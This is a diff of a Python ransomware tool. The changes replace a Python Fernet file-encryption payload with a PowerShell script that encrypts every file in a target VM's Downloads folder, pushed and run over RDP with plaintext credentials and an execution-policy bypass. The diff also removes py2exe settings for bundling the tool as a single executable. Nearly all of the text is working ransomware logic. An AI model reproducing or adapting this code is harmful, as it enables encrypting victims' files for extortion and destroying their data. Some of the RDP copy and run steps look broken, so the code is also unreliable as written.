@@ -1,5 +1,4 @@
 from distutils.core import setup
-import py2exe
 import os
 import subprocess
 from cryptography.fernet import Fernet
@@ -23,34 +22,21 @@ class Ransomware:
     # Encrypt all files in a folder on a different VM using RDP (rdesktop)
     def vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
         # Create the script file content for the target VM
-        script_content = f'''
-import os
-from cryptography.fernet import Fernet
+        script_content = r'''
+$key = "{}"
 
-def encrypt_file(file_path, key):
-    with open(file_path, 'rb') as file:
-        data = file.read()
-    
-    fernet = Fernet(key)
-    encrypted_data = fernet.encrypt(data)
-    
-    with open(file_path, 'wb') as file:
-        file.write(encrypted_data)
+$files = Get-ChildItem -Path $HOME\Downloads -File -Recurse
 
-downloads_folder_path = os.path.join(os.path.expanduser('~'), "Downloads")
+foreach ($file in $files) {
+    $data = Get-Content -Path $file.FullName -Encoding Byte -ReadCount 0
+    $encryptedData = [System.Security.Cryptography.ProtectedData]::Protect($data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    Set-Content -Path $file.FullName -Value $encryptedData -Encoding Byte
+}
+'''.format(self.key.decode())
 
-for root, dirs, files in os.walk(downloads_folder_path):
-    for file in files:
-        file_path = os.path.join(root, file)
-        encrypt_file(file_path, {self.key!r})
-
-# Encrypt the script file itself
-script_path = os.path.abspath(__file__)
-encrypt_file(script_path, {self.key!r})
-'''
 
         # Generate a random script name
-        script_name = "encrypt_script.py"
+        script_name = "encrypt_script.ps1"
         script_path = os.path.join(os.getcwd(), script_name)
         
         # Write the script file locally
@@ -60,9 +46,8 @@ encrypt_file(script_path, {self.key!r})
         # Copy the script file to the target VM using RDP (rdesktop)
         copy_script_command = f'echo {script_path} | rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" {target_vm_ip}'
         subprocess.Popen(copy_script_command, shell=True)
-
         # Run the script on the target VM using RDP (rdesktop)
-        run_script_command = f'rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" -s "python3 /home/{rdp_username}/{script_name}" {target_vm_ip}'
+        run_script_command = f'rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" -s "powershell -ExecutionPolicy Bypass -File /home/{rdp_username}/{script_name}" {target_vm_ip}'
         subprocess.Popen(run_script_command, shell=True)
 
     
@@ -107,15 +92,3 @@ while True:
         print("Invalid choice. Please choose a valid option.")
         break
 
-
-# py2exe configurations
-setup(
-    options={
-        'py2exe': {
-            'bundle_files': 1,
-            'compressed': True
-        }
-    },
-    console=['Ransome(RDP).py'], 
-    zipfile=None
-)
